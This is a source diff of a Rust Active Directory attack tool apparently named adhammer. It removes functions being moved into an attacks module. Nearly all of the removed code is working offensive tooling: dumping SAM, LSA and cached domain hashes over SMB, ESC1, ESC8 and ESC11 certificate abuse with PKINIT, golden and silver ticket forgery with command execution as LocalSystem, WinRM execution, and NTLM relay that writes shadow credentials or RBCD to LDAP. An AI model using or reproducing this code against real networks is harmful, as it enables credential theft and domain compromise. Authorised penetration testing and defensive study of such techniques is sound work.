-                            "[!] RRP OpenHKLM failed ({e}) — falling back to `reg save` hives"
-                        );
-                        None
-                    }
-                }
-            }
-            None => None,
-        }
-    };
-
-    // Skip `reg save` for anything RRP already delivered. If RRP handled EVERYTHING (bootkey
-    // + SAM + LSA) we never touch SVCCTL/`reg save` — the hive-based fallback is only for
-    // hives whose data we still need.
-    let sys_rel = "Windows\\Temp\\ADh_sys.tmp";
-    let sam_rel = "Windows\\Temp\\ADh_sam.tmp";
-    let sec_rel = "Windows\\Temp\\ADh_sec.tmp";
-    let want_system = bootkey_rrp.is_none();
-    let want_sam = rrp_sam.is_none();
-    let want_security = rrp_lsa.is_none();
-    let mut hives: Vec<(&str, &str)> = Vec::new();
-    if want_system {
-        hives.push(("SYSTEM", sys_rel));
-    }
-    if want_sam {
-        hives.push(("SAM", sam_rel));
-    }
-    if want_security {
-        hives.push(("SECURITY", sec_rel));
-    }
-    for (hive, rel) in &hives {
-        smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
-        let cmd = format!("reg save HKLM\\{hive} C:\\{rel} /y");
-        let ret = dcerpc::svcctl::run(&mut smb, &cmd).await?;
-        tracing::info!("reg save {hive}: SCM start win32 {ret}");
-    }
-
-    let (system, sam, security) = if hives.is_empty() {
-        (None, None, None)
-    } else {
-        smb.tree_connect(&format!("\\\\{}\\C$", a.host)).await?;
-        let sys = if want_system {
-            Some(
-                smb.read_file_delete(sys_rel)
-                    .await
-                    .context("read SYSTEM hive over C$")?,
-            )
-        } else {
-            None
-        };
-        let sa = if want_sam {
-            smb.read_file_delete(sam_rel).await.ok()
-        } else {
-            None
-        };
-        let se = if want_security {
-            smb.read_file_delete(sec_rel).await.ok()
-        } else {
-            None
-        };
-        (sys, sa, se)
-    };
-    eprintln!(
-        "[+] hives: SYSTEM {}, SAM {}, SECURITY {}",
-        system
-            .as_ref()
-            .map_or("skipped (RRP)".into(), |v| format!("{} B", v.len())),
-        sam.as_ref()
-            .map_or("unavailable".into(), |v| format!("{} B", v.len())),
-        security
-            .as_ref()
-            .map_or("unavailable".into(), |v| format!("{} B", v.len())),
-    );
-    if sam.is_none() || security.is_none() {
-        eprintln!(
-            "[!] a protected hive was denied by the target (SeBackupPrivilege / hardening). \
-             On a DC, use `attack dcsync` for domain secrets — SAM/LSA here cover only local creds."
-        );
-    }
-
-    // --- SAM: local account NT hashes ---
-    let sam_accounts: Option<Vec<adhammer_secrets::SamAccount>> = if let Some(u) = rrp_sam {
-        Some(u)
-    } else {
-        match (sam.as_ref(), bootkey_rrp.as_ref(), system.as_ref()) {
-            (Some(s), Some(bk), _) => adhammer_secrets::local_dump_with_bootkey(s, bk)
-                .map_err(|e| eprintln!("[-] SAM decrypt failed: {e}"))
-                .ok(),
-            (Some(s), None, Some(sys)) => adhammer_secrets::local_dump(sys, s)
-                .map_err(|e| eprintln!("[-] SAM decrypt failed: {e}"))
-                .ok(),
-            _ => None,
-        }
-    };
-    match sam_accounts {
-        Some(accounts) => {
-            eprintln!("[+] {} local account(s):", accounts.len());
-            for acct in accounts {
-                println!("{}", acct.secretsdump_line());
-            }
-        }
-        None => eprintln!("[*] SAM hive unavailable — skipping local accounts"),
-    }
-
-    // --- LSA secrets + cached domain credentials (DCC2) ---
-    // RRP path returns secrets only (DCC2 needs BaseRegEnumValue — follow-up); hive path
-    // returns both.
-    if let Some(secrets) = rrp_lsa {
-        eprintln!("[+] {} LSA secret(s):", secrets.len());
-        for s in &secrets {
-            if s.name.eq_ignore_ascii_case("$MACHINE.ACC") {
-                let nt: String = ntlmssp::md4(&s.secret)
-                    .iter()
-                    .map(|b| format!("{b:02x}"))
-                    .collect();
-                println!("$MACHINE.ACC:aad3b435b51404eeaad3b435b51404ee:{nt}:::");
-            } else {
-                print_lsa_secret(&s.name, &s.secret);
-            }
-        }
-        eprintln!(
-            "[*] DCC2 cache via RRP not yet implemented — falling back requires the SECURITY hive."
-        );
-        return Ok(());
-    }
-    let Some(security) = security.as_ref() else {
-        eprintln!("[*] SECURITY hive unavailable — skipping LSA secrets / DCC2");
-        return Ok(());
-    };
-    let lsa_result = match (bootkey_rrp.as_ref(), system.as_ref()) {
-        (Some(bk), _) => adhammer_secrets::local_lsa_with_bootkey(security, bk),
-        (None, Some(sys)) => adhammer_secrets::local_lsa(sys, security),
-        _ => Err("no bootkey and no SYSTEM hive — cannot derive LSA key".into()),
-    };
-    match lsa_result {
-        Ok(dump) => {
-            eprintln!("[+] {} LSA secret(s):", dump.secrets.len());
-            for s in &dump.secrets {
-                if s.name.eq_ignore_ascii_case("$MACHINE.ACC") {
-                    let nt: String = ntlmssp::md4(&s.secret)
-                        .iter()
-                        .map(|b| format!("{b:02x}"))
-                        .collect();
-                    println!("$MACHINE.ACC:aad3b435b51404eeaad3b435b51404ee:{nt}:::");
-                } else {
-                    print_lsa_secret(&s.name, &s.secret);
-                }
-            }
-            if !dump.cached.is_empty() {
-                eprintln!(
-                    "[+] {} cached domain logon(s) (hashcat -m 2100):",
-                    dump.cached.len()
-                );
-                for c in &dump.cached {
-                    println!("{}", c.dcc2_line());
-                }
-            }
-        }
-        Err(e) => eprintln!("[-] LSA decrypt failed: {e}"),
-    }
-    Ok(())
-}
-
-/// Print an LSA secret readably: a printable UTF-16 string, else hex.
-fn print_lsa_secret(name: &str, secret: &[u8]) {
-    // Render as text only if it's a clean printable-ASCII UTF-16 string (e.g. DefaultPassword);
-    // binary key material (NL$KM, DPAPI_SYSTEM) prints as hex.
-    let units: Vec<u16> = secret
-        .chunks_exact(2)
-        .map(|c| u16::from_le_bytes([c[0], c[1]]))
-        .take_while(|&u| u != 0)
-        .collect();
-    let printable = !units.is_empty() && units.iter().all(|&u| (0x20..0x7f).contains(&u));
-    if printable {
-        println!("{name}:{}", String::from_utf16_lossy(&units));
-    } else {
-        println!("{name}:{}", hex::encode(secret));
-    }
-}
-
-/// AD CS ESC1: build a PKCS#10 CSR whose SAN is the target UPN, enroll it on an
-/// enrollee-supplies-subject template via MS-ICPR, and save the issued client-auth cert + key.
-/// The cert can then PKINIT as the impersonated principal.
-async fn esc1(a: Esc1Args) -> Result<()> {
-    use smb2_client::SmbClient;
-
-    let subject = a.upn.split('@').next().unwrap_or("adhammer");
-    let csr = adhammer_kerberos::csr::build_csr(subject, Some(&a.upn))?;
-    eprintln!("[*] CSR built (subject CN={subject}, SAN upn={})", a.upn);
-
-    let mut smb = SmbClient::connect(&a.host).await?;
-    smb.login(&a.host, &a.domain, &a.user, &a.password).await?;
-    smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
-
-    let r = dcerpc::icpr::request_cert(
-        &mut smb,
-        &a.ca,
-        &a.template,
-        &csr.der,
-        &a.domain,
-        &a.user,
-        &a.password,
-        &a.host,
-    )
-    .await?;
-
-    // Disposition: 3 = ISSUED, 5 = UNDER SUBMISSION (pending).
-    if r.disposition == 3 && !r.cert_der.is_empty() {
-        std::fs::write(&a.out, &r.cert_der)?;
-        let key_path = format!("{}.key.pem", a.out);
-        std::fs::write(&key_path, &csr.key_pem)?;
-        println!(
-            "[+] ESC1: certificate ISSUED for UPN {} → {} ({} bytes), key → {}",
-            a.upn,
-            a.out,
-            r.cert_der.len(),
-            key_path
-        );
-
-        if a.pkinit {
-            let kdc = a.kdc.clone().unwrap_or_else(|| a.host.clone());
-            let realm = a.upn.split('@').nth(1).unwrap_or(&a.domain).to_string();
-            match adhammer_kerberos::pkinit::pkinit_with_cert(
-                subject,
-                &realm,
-                &kdc,
-                &csr.key_pem,
-                Some(&r.cert_der),
-            )
-            .await
-            {
-                Ok(tgt) => {
-                    let ccache = format!("{subject}.ccache");
-                    std::fs::write(&ccache, &tgt.ccache)?;
-                    println!("[+] PKINIT OK — TGT obtained as {subject}; ccache → {ccache}");
-                    println!(
-                        "    KRB5CCNAME={ccache} → use for Kerberos auth (dcsync, exec via -k, …)"
-                    );
-                }
-                Err(e) => {
-                    println!("[-] PKINIT with the issued cert failed: {e:#}");
-                    if e.to_string().contains("error 66") {
-                        println!("    (KDC_ERR_CANT_VERIFY_CERTIFICATE — likely strong certificate-mapping");
-                        println!("     enforcement (KB5014754): a UPN-only cert has no SID mapping to the");
-                        println!("     target, so the KDC refuses it. ESC1 escalation is mitigated on this DC.");
-                        println!("     The cert was still issued — the template is vulnerable.)");
-                    }
-                }
-            }
-        } else {
-            println!(
-                "    next: --pkinit to turn this cert into a TGT as {}",
-                subject
-            );
-        }
-    } else {
-        println!(
-            "[-] enrollment not issued (disposition {}): {}",
-            r.disposition, r.message
-        );
-    }
-    Ok(())
-}
+// fn esc1 moved to attacks::esc1 in arch-0.
 
 // fn golden moved to attacks::golden in arch-0.
 
 // fn silver moved to attacks::silver in arch-0.
 
-/// Pass-the-ticket: forge a golden or silver ticket, obtain a service ticket for the SPN, and
-/// authenticate to SMB with a Kerberos AP-REQ — then optionally run a command as the impersonated
-/// identity (LocalSystem via SVCCTL). The end-to-end proof that a forged ticket grants access.
-/// True if `s` looks like an IPv4/IPv6 literal (heuristic — good enough for the SPN check).
-fn looks_like_ip(s: &str) -> bool {
-    s.parse::<std::net::IpAddr>().is_ok()
-}
-
-async fn pth(a: PthArgs) -> Result<()> {
-    use adhammer_kerberos::pac::ForgeIdentity;
-    use smb2_client::SmbClient;
-
-    let subs: Vec<u32> = a
-        .domain_sid
-        .trim_start_matches("S-1-5-")
-        .split('-')
-        .map(|x| x.parse::<u32>())
-        .collect::<std::result::Result<_, _>>()
-        .context("--domain-sid must be S-1-5-21-a-b-c")?;
-    let spn = a.spn.clone().unwrap_or_else(|| format!("cifs/{}", a.host));
-    // Kerberos SPNs are registered against hostnames/FQDNs — never against IPs. Save the user
-    // a `KDC_ERR_S_PRINCIPAL_UNKNOWN` roundtrip by front-checking.
-    if spn.split('/').nth(1).is_some_and(looks_like_ip) {
-        anyhow::bail!(
-            "SPN '{spn}' points at an IP — the KDC only knows SPNs registered against \
-             hostnames/FQDNs and will return KDC_ERR_S_PRINCIPAL_UNKNOWN (7). Pass \
-             `--host <fqdn>` (e.g. dc.corp.local) or `--spn cifs/<fqdn>` explicitly."
-        );
-    }
-    let id = ForgeIdentity {
-        user: a.user.clone(),
-        rid: a.rid,
-        primary_gid: 513,
-        group_rids: a.groups.clone(),
-        domain_subauths: subs,
-        logon_server: a.realm.split('.').next().unwrap_or("DC").to_uppercase(),
-        logon_domain: a.realm.split('.').next().unwrap_or("DOMAIN").to_uppercase(),
-    };
-
-    // Build the service ticket: golden → TGS-REQ; silver → forged directly.
-    let st = match (&a.krbtgt_aes256, &a.service_aes256) {
-        (Some(k), None) => {
-            let key = parse_forge_key(k, a.rc4)?;
-            let kdc = a.kdc.clone().unwrap_or_else(|| a.host.clone());
-            let tgt = adhammer_kerberos::forge_golden_tgt(&id, &a.realm, &key, a.rc4)?;
-            println!("[+] forged golden TGT for {}@{}", a.user, a.realm);
-            let st = adhammer_kerberos::get_service_ticket(&tgt, &spn, &kdc).await?;
-            println!("[+] got service ticket for {spn} (KDC accepted the golden TGT)");
-            st
-        }
-        (None, Some(k)) => {
-            let key = parse_forge_key(k, a.rc4)?;
-            let tgt = adhammer_kerberos::forge_silver_tgt(&id, &a.realm, &key, &spn, a.rc4)?;
-            println!("[+] forged silver ticket for {spn}");
-            adhammer_kerberos::silver_service_ticket(&tgt, &spn)
-        }
-        _ => anyhow::bail!(
-            "provide exactly one of --krbtgt-aes256 (golden) or --service-aes256 (silver)"
-        ),
-    };
-
-    let (blob, key) = adhammer_kerberos::build_ap_req_gss(&st)?;
-    let mut smb = SmbClient::connect(&a.host).await?;
-    smb.login_kerberos(&blob, &key).await?;
-    println!(
-        "[+] Kerberos SMB session established as {} (pass-the-ticket)",
-        a.user
-    );
-
-    if let Some(cmd) = &a.command {
-        smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
-        let r = dcerpc::svcctl::exec(&mut smb, &a.host, cmd).await?;
-        println!(
-            "[+] ran as LocalSystem (service '{}', win32 {})",
-            r.service, r.start_win32
-        );
-        match r.output {
-            Some(o) if !o.is_empty() => println!("\n{o}"),
-            _ => println!("[*] no output captured"),
-        }
-    } else {
-        smb.tree_connect(&format!("\\\\{}\\C$", a.host)).await?;
-        println!(
-            "[+] tree-connected \\\\{}\\C$ — authenticated access confirmed",
-            a.host
-        );
-    }
-    Ok(())
-}
+// fn pth + fn looks_like_ip moved to attacks::ptt in arch-0.
 
 // fn gmsa moved to attacks::gmsa in arch-0.
 
 // fn laps moved to attacks::laps in arch-0.
 
-/// Execute a command over WinRM (WS-Man). NTLM auth + MS-NLMP message encryption over 5985 —
-/// quieter than SVCCTL (no service-install event) and often the only lateral path left open.
-async fn winrm_exec(mut a: WinrmArgs) -> Result<()> {
-    a.password = resolve_secret(&a.password, "ADHAMMER_PASSWORD")?;
-    let secret = match &a.nt_hash {
-        Some(h) => {
-            let raw = hex::decode(h.trim()).context("NT hash must be 32 hex chars")?;
-            let arr: [u8; 16] = raw
-                .as_slice()
-                .try_into()
-                .context("NT hash must be exactly 16 bytes (32 hex)")?;
-            winrm::Secret::NtHash(arr)
-        }
-        None => winrm::Secret::Password(a.password.clone()),
-    };
-    let (mut client, shell_id) =
-        winrm::WinRm::connect(&a.host, a.port, &a.domain, &a.user, &secret).await?;
-    eprintln!(
-        "[+] WinRM shell opened on {} (ShellId {})",
-        a.host, shell_id
-    );
-    let (stdout, stderr, exit) = client.run(&shell_id, &a.command).await?;
-    print!("{stdout}");
-    if !stderr.is_empty() {
-        eprint!("{stderr}");
-    }
-    eprintln!("[+] WinRM command exited {exit}");
-    Ok(())
-}
+// fn winrm_exec moved to attacks::winrm_exec in arch-0.
 
 /// Enumerate AD-integrated DNS over LDAP (adidnsdump-equivalent): list every zone + record from
 /// the DomainDnsZones/ForestDnsZones partitions, and flag wildcard nodes — a wildcard (or any
@@ -2096,357 +1121,7 @@ const SERVICES: &[(u16, &str)] = &[
 /// Ports whose services send a text greeting on connect — grab it for version intel.
 const GREETERS: &[u16] = &[21, 22, 25, 110, 143];
 
-/// One of the write-actions the relay can perform once it has an LDAP session as the victim.
-///
-/// Internal / data-carrying twin of the CLI-facing [`RelayTarget`] value_enum:
-/// the CLI parses the selector, then this enum carries the resolved
-/// CA host/port/template/insecure into the spawn loop.
-#[derive(Clone, Debug)]
-enum RelayAction {
-    /// Write msDS-KeyCredentialLink on `target_object` (shadow credentials → PKINIT).
-    LdapKeycred,
-    /// Write msDS-AllowedToActOnBehalfOfOtherIdentity on `target_object` (RBCD → S4U2Proxy).
-    LdapRbcd,
-    /// ESC8 — relay to AD CS Web Enrollment: `(ca_host, ca_port, template, insecure)`.
-    AdcsHttp(String, u16, String, bool),
-    /// ESC11 — relay to MS-ICPR (`\PIPE\cert` alternative ncacn_ip_tcp endpoint): `(ca_host, template)`.
-    Icpr(String, String),
-}
-
-/// NTLM relay: receive a coerced/poisoned SMB auth and relay it to a DC's LDAP as the victim,
-/// then perform a chosen write on `target_object`. Chain with `attack coerce`/`poison`.
-async fn relay(a: RelayArgs) -> Result<()> {
-    use smb2_client::server::RelayConn;
-
-    // Resolve --target early so the user gets a clear error before the listener is up.
-    let (target, trustee_sid) = match a.target {
-        RelayTarget::LdapKeycred => (RelayAction::LdapKeycred, None),
-        RelayTarget::LdapRbcd => {
-            let sid = a.trustee_sid.clone().ok_or_else(|| {
-                anyhow::anyhow!(
-                    "--target ldap-rbcd requires --trustee-sid <SID of a controlled account>"
-                )
-            })?;
-            (RelayAction::LdapRbcd, Some(sid))
-        }
-        RelayTarget::AdcsHttp => {
-            let ca = a.ca_host.clone().ok_or_else(|| {
-                anyhow::anyhow!("--target adcs-http requires --ca-host <ca.corp.local>")
-            })?;
-            (
-                RelayAction::AdcsHttp(ca, a.ca_port, a.ca_template.clone(), a.ca_insecure),
-                None,
-            )
-        }
-        RelayTarget::Icpr => {
-            let ca = a.ca_host.clone().ok_or_else(|| {
-                anyhow::anyhow!("--target icpr requires --ca-host <ca.corp.local>")
-            })?;
-            (RelayAction::Icpr(ca, a.ca_template.clone()), None)
-        }
-    };
-
-    let base: String = a
-        .realm
-        .split('.')
-        .map(|p| format!("DC={p}"))
-        .collect::<Vec<_>>()
-        .join(",");
-    let listener = RelayConn::listen(&a.listen).await?;
-    println!(
-        "[*] relay listening on {} → LDAP {} ({:?} on {})",
-        a.listen, a.target_dc, target, a.target_object
-    );
-    println!("    now coerce/poison a victim toward this host (e.g. attack coerce --pipe spoolss --listener <us>)");
-    loop {
-        let (stream, peer) = listener.accept().await?;
-        let (target_dc, base, target_object, trustee, tgt) = (
-            a.target_dc.clone(),
-            base.clone(),
-            a.target_object.clone(),
-            trustee_sid.clone(),
-            target.clone(),
-        );
-        tokio::spawn(async move {
-            if let Err(e) = relay_one(
-                stream,
-                &peer.to_string(),
-                &target_dc,
-                &base,
-                &target_object,
-                tgt,
-                trustee.as_deref(),
-            )
-            .await
-            {
-                println!("[-] relay from {peer} failed: {e}");
-            }
-        });
-    }
-}
-
-#[allow(clippy::too_many_arguments)]
-async fn relay_one(
-    stream: tokio::net::TcpStream,
-    peer: &str,
-    target_dc: &str,
-    base: &str,
-    target_object: &str,
-    target: RelayAction,
-    trustee_sid: Option<&str>,
-) -> Result<()> {
-    use smb2_client::server::RelayConn;
-    let mut rc = RelayConn::new(stream);
-    let type1 = rc.recv_type1().await?;
-
-    // ESC8 relay: HTTP not LDAP, so branch off before opening the LDAP client.
-    if let RelayAction::AdcsHttp(ref ca_host, port, ref template, insecure) = target {
-        return relay_esc8(
-            rc,
-            type1,
-            peer,
-            target_object,
-            ca_host,
-            port,
-            template,
-            insecure,
-        )
-        .await;
-    }
-    // ESC11 relay: ncacn_ip_tcp to MS-ICPR — NTLM auth handshake, then unsealed CertServerRequest.
-    if let RelayAction::Icpr(ref ca_host, ref template) = target {
-        return relay_icpr(rc, type1, peer, target_object, ca_host, template).await;
-    }
-
-    println!("[+] victim {peer} started NTLM — relaying to {target_dc} LDAP");
-    let mut ld = adhammer_ldap::LdapClient::connect(&format!("{target_dc}:389")).await?;
-    let type2 = ld.sasl_step1(&type1).await?; // target's challenge
-    rc.send_challenge(&type2).await?; // → victim signs the target's challenge
-    let type3 = rc.recv_type3().await?;
-    ld.sasl_step2(&type3).await?; // now authenticated to the DC AS the victim
-    println!("[+] relayed bind to {target_dc} succeeded as the victim");
-    let dn = ld.find_dn(base, target_object).await?;
-
-    match target {
-        RelayAction::AdcsHttp(_, _, _, _) | RelayAction::Icpr(_, _) => {
-            unreachable!("handled above")
-        }
-        RelayAction::LdapKeycred => {
-            let kc = adhammer_kerberos::shadowcred::build_key_credential(&dn)?;
-            ld.modify_add(&dn, "msDS-KeyCredentialLink", kc.dn_binary.as_bytes())
-                .await?;
-            std::fs::write(format!("{target_object}.key.pem"), &kc.private_key_pem)?;
-            println!("[+] Shadow Credential written on {dn} — key {target_object}.key.pem");
-            println!("    → attack abuse --action pkinit --target {target_object} --realm <realm> --kdc {target_dc}");
-        }
-        RelayAction::LdapRbcd => {
-            let trustee = trustee_sid.expect("checked in relay(): --trustee-sid required");
-            let trustee = windows_sddl::sid::Sid::parse(trustee)
-                .ok_or_else(|| anyhow::anyhow!("bad trustee SID: {trustee}"))?;
-            let sd = windows_sddl::build_rbcd_sd(&trustee);
-            ld.modify_add(&dn, "msDS-AllowedToActOnBehalfOfOtherIdentity", &sd)
-                .await?;
-            println!(
-                "[+] RBCD written on {dn} — trustee {} can now S4U2Proxy → any user on {target_object}",
-                trustee_sid.unwrap()
-            );
-            println!(
-                "    → attack rbcd --host <trustee-host> --target-spn cifs/{target_object} --target-user Administrator"
-            );
-        }
-    }
-    Ok(())
-}
-
-/// ESC8 — relay a victim's SMB NTLM to AD CS Web Enrollment. Sends `Type1` in the
-/// Authorization header on the CSR POST (empty body on the probe), takes the DC's `Type2`
-/// out of the `WWW-Authenticate` header, sends it back to the victim, forwards the returned
-/// `Type3` on the same TCP connection with the real CSR body — the CA issues a certificate
-/// whose Kerberos identity is the relayed victim. Write cert + private key to disk so the
-/// attacker can PKINIT with them.
-#[allow(clippy::too_many_arguments)]
-async fn relay_esc8(
-    mut rc: smb2_client::server::RelayConn,
-    type1: Vec<u8>,
-    peer: &str,
-    target_object: &str,
-    ca_host: &str,
-    ca_port: u16,
-    template: &str,
-    insecure: bool,
-) -> Result<()> {
-    use adcs_relay::{
-        base64_decode, base64_encode, cert_request_form, parse_ntlm_challenge, parse_request_id,
-        HttpsClient,
-    };
-
-    println!(
-        "[+] victim {peer} started NTLM — relaying to https://{ca_host}:{ca_port}/certsrv/ (ESC8)"
-    );
-    let mut http = HttpsClient::connect(ca_host, ca_port, insecure).await?;
-
-    // Generate a fresh CSR; the subject is unused (the CA identifies the requester via the
-    // authenticated Kerberos/NTLM channel — that's the victim we're relaying).
-    let csr = adhammer_kerberos::csr::build_csr("adhammer-esc8", None)?;
-    let csr_pem = pem_wrap("CERTIFICATE REQUEST", &csr.der);
-    let form = cert_request_form(&csr_pem, template);
-
-    // Round 1: POST with Type-1 in Authorization; probe body kept minimal until the auth loop
-    // completes on Type-3, when we send the real CSR form.
-    let type1_b64 = base64_encode(&type1);
-    let auth1 = format!("NTLM {type1_b64}");
-    let headers1: &[(&str, &str)] = &[
-        ("Authorization", &auth1),
-        ("Content-Type", "application/x-www-form-urlencoded"),
-        ("User-Agent", "adhammer-esc8/1"),
-    ];
-    let r1 = http
-        .send("POST", "/certsrv/certfnsh.asp", headers1, b"")
-        .await?;
-    if r1.status != 401 {
-        anyhow::bail!(
-            "CA expected 401 with WWW-Authenticate NTLM Type-2, got {} (server may reject relayed auth)",
-            r1.status
-        );
-    }
-    let type2 = r1
-        .header("WWW-Authenticate")
-        .and_then(parse_ntlm_challenge)
-        .context("no NTLM Type-2 in WWW-Authenticate")?;
-
-    // Forward Type-2 to the victim and get Type-3 back.
-    rc.send_challenge(&type2).await?;
-    let type3 = rc.recv_type3().await?;
-
-    // Round 2: POST with Type-3 in Authorization AND the CSR form body.
-    let type3_b64 = base64_encode(&type3);
-    let auth3 = format!("NTLM {type3_b64}");
-    let headers3: &[(&str, &str)] = &[
-        ("Authorization", &auth3),
-        ("Content-Type", "application/x-www-form-urlencoded"),
-        ("User-Agent", "adhammer-esc8/1"),
-    ];
-    let r2 = http
-        .send("POST", "/certsrv/certfnsh.asp", headers3, form.as_bytes())
-        .await?;
-    if r2.status != 200 {
-        anyhow::bail!(
-            "CA rejected the CSR submission after NTLM auth: HTTP {} (template `{template}` may require different attrs, or the relayed identity lacks Enroll)",
-            r2.status
-        );
-    }
-    let html = String::from_utf8_lossy(&r2.body);
-    let req_id = parse_request_id(&html).context("no ReqID in ASP response (submission failed)")?;
-    println!("[+] CA accepted submission — Request ID {req_id}, fetching certificate…");
-
-    // Round 3: GET the issued cert. This may reuse the same connection or open a new one;
-    // AD CS is happy with either — send unauthenticated (session already established), and if
-    // the CA insists, replaying Type-3 here works because it was on the same stream.
-    let path = format!("/certsrv/certnew.cer?ReqID={req_id}&Enc=b64");
-    let r3 = http
-        .send("GET", &path, &[("User-Agent", "adhammer-esc8/1")], b"")
-        .await?;
-    if r3.status != 200 {
-        anyhow::bail!("certnew.cer returned HTTP {} for ReqID {req_id}", r3.status);
-    }
-    // The response is either PEM or a base64 blob depending on `Enc=b64`.
-    let cert_bytes = if r3.body.starts_with(b"-----BEGIN") {
-        r3.body.clone()
-    } else {
-        let s = String::from_utf8_lossy(&r3.body);
-        base64_decode(s.trim())
-            .map(|der| pem_wrap("CERTIFICATE", &der).into_bytes())
-            .unwrap_or(r3.body.clone())
-    };
-    let cert_path = format!("{target_object}.esc8.pem");
-    let key_path = format!("{target_object}.esc8.key.pem");
-    std::fs::write(&cert_path, &cert_bytes)?;
-    std::fs::write(&key_path, csr.key_pem.as_bytes())?;
-    println!("[+] certificate written to {cert_path} — key {key_path}");
-    println!(
-        "    → attack abuse --action pkinit --target <victim-sam> --value {key_path} --kdc <dc> --realm <realm>"
-    );
-    Ok(())
-}
-
-/// ESC11 — relay a victim's SMB NTLM to MS-ICPR (`ICertPassage`) on the CA's ncacn_ip_tcp
-/// endpoint. Same shape as ESC8: forward Type1 → get Type2 back → forward to victim → get
-/// Type3 → complete auth. Then submit the CSR via `CertServerRequest` (opnum 0).
-///
-/// Uses auth-level `PKT_CONNECT`, not `PKT_PRIVACY` — the relaying attacker doesn't hold the
-/// victim's NTLM session key, so per-message signing/sealing is impossible. Whether the CA's
-/// ICPR endpoint accepts CONNECT-level auth is a per-server config; if it enforces PRIVACY
-/// (spec says it SHOULD), the CertServerRequest will fault with a clear RPC error rather
-/// than silently misbehave.
-async fn relay_icpr(
-    mut rc: smb2_client::server::RelayConn,
-    type1: Vec<u8>,
-    peer: &str,
-    target_object: &str,
-    ca_host: &str,
-    template: &str,
-) -> Result<()> {
-    use dcerpc::{epm, icpr, transport::RpcTcp};
-
-    println!("[+] victim {peer} started NTLM — relaying to MS-ICPR at {ca_host} (ESC11)");
-    let port = epm::resolve_port(ca_host, icpr::icpr_syntax()).await?;
-    let mut rpc = RpcTcp::connect(&format!("{ca_host}:{port}")).await?;
-
-    // 3-leg NTLM handshake, opaquely forwarded.
-    let type2 = rpc.bind_relay_start(icpr::icpr_syntax(), &type1).await?;
-    rc.send_challenge(&type2).await?;
-    let type3 = rc.recv_type3().await?;
-    rpc.bind_relay_finish(&type3).await?;
-    println!("[+] relayed CONNECT-level bind to ICPR succeeded as the victim");
-
-    // Generate a fresh CSR and submit — the CA identifies the requester from the relayed
-    // authentication, so no subject encoding is needed on our side.
-    let csr = adhammer_kerberos::csr::build_csr("adhammer-esc11", None)?;
-    // The CA name is a required arg to CertServerRequest; on most CAs the ICPR endpoint
-    // will infer it from context, but a client that sends the CN of the certification
-    // authority is safe. The `target_object` name is not it — take the machine short-name.
-    let authority = ca_host.split('.').next().unwrap_or(ca_host);
-    let stub = icpr::encode_cert_server_request(authority, template, &csr.der);
-    let resp = rpc
-        .call(icpr::CERT_SERVER_REQUEST_OPNUM, &stub)
-        .await
-        .map_err(|e| {
-            anyhow::anyhow!(
-                "CertServerRequest failed — the CA likely enforces PKT_PRIVACY on ICPR (matrix-validation-owed): {e}"
-            )
-        })?;
-    let result = icpr::decode_cert_server_response(&resp)?;
-    if result.disposition != 3 {
-        anyhow::bail!(
-            "CA disposition {}: {} (3 = ISSUED, 5 = UNDER SUBMISSION, else denied)",
-            result.disposition,
-            result.message
-        );
-    }
-    let cert_pem = pem_wrap("CERTIFICATE", &result.cert_der);
-    let cert_path = format!("{target_object}.esc11.pem");
-    let key_path = format!("{target_object}.esc11.key.pem");
-    std::fs::write(&cert_path, cert_pem.as_bytes())?;
-    std::fs::write(&key_path, csr.key_pem.as_bytes())?;
-    println!("[+] ISSUED — certificate written to {cert_path} — key {key_path}");
-    println!(
-        "    → attack abuse --action pkinit --target <victim-sam> --value {key_path} --kdc <dc> --realm <realm>"
-    );
-    Ok(())
-}
-
-/// Wrap raw DER as PEM with the given label.
-fn pem_wrap(label: &str, der: &[u8]) -> String {
-    use adcs_relay::base64_encode;
-    let b64 = base64_encode(der);
-    let mut out = format!("-----BEGIN {label}-----\n");
-    for line in b64.as_bytes().chunks(64) {
-        out.push_str(std::str::from_utf8(line).unwrap());
-        out.push('\n');
-    }
-    out.push_str(&format!("-----END {label}-----\n"));
-    out
-}
+// RelayAction + RelayArgs+ RelayTarget + fn relay + relay_one + relay_esc8 + relay_icpr + pem_wrap moved to attacks::relay in arch-0.
 
 /// Network sweep: full service scan + banner grab per target, DC detection, and SMB signing
 /// (NTLM-relay) posture — the attack-surface map for the whole estate.
@@ -4000,172 +2675,7 @@ async fn dump_gmsa(a: DumpGmsaArgs) -> Result<()> {
     })
     .await
 }
-
-/// `attack icpr-esc1` — build an ESC1 CSR via `ms-icpr` with an attacker-supplied UPN
-/// SAN and marshal the `CertServerRequest` opnum-0 input stub. Offline: writes the
-/// CSR + stub to disk (and a fresh RSA key if none supplied) so the wire can be
-/// verified before a live submission. The sealed `\PIPE\cert` transport requires
-/// `ms-icpr`'s `network` feature — disabled in this build to keep the workspace
-/// off the `dcerpc↔ms-nrpc` resolver cycle — and stays a TODO here.
-async fn icpr_esc1(a: IcprEsc1Args) -> Result<()> {
-    use ms_crtd::flags::{EnrollmentFlag, NameFlag, PrivateKeyFlag};
-    use ms_crtd::model::CertTemplate;
-    use ms_crtd::oid::Oid;
-
-    let key_pem = if let Some(path) = &a.key {
-        std::fs::read(path).with_context(|| format!("read --key {path}"))?
-    } else {
-        use rsa::pkcs8::EncodePrivateKey;
-        use rsa::RsaPrivateKey;
-        let mut rng = rand::thread_rng();
-        let key = RsaPrivateKey::new(&mut rng, 2048).context("generate RSA-2048 for CSR")?;
-        let pem = key
-            .to_pkcs8_pem(rsa::pkcs8::LineEnding::LF)
-            .context("encode key PKCS#8 PEM")?;
-        let pem_bytes = pem.as_bytes().to_vec();
-        let key_path = format!("{}.key.pem", a.csr_out);
-        std::fs::write(&key_path, &pem_bytes)?;
-        eprintln!("[+] generated 2048-bit RSA key → {key_path}");
-        pem_bytes
-    };
-
-    // Build the CSR according to the ESC variant. ESC1/ESC6 use the plain
-    // UPN-SAN CSR; ESC15 injects an EKU via Microsoft Application Policies
-    // (EKUwu shape); ESC3 builds the plain CSR, and the CMS EOBO wrapping
-    // happens later in the dispatch section below.
-    let csr = match a.esc {
-        EscVariant::Esc15 => ms_icpr::build_csr_with_upn_san_and_ekus(
-            &a.subject,
-            &a.target_upn,
-            &[a.esc15_eku.as_str()],
-            &key_pem,
-            ms_icpr::EkuCarrier::ApplicationPolicies,
-        )
-        .context("build_csr_with_upn_san_and_ekus (esc15)")?,
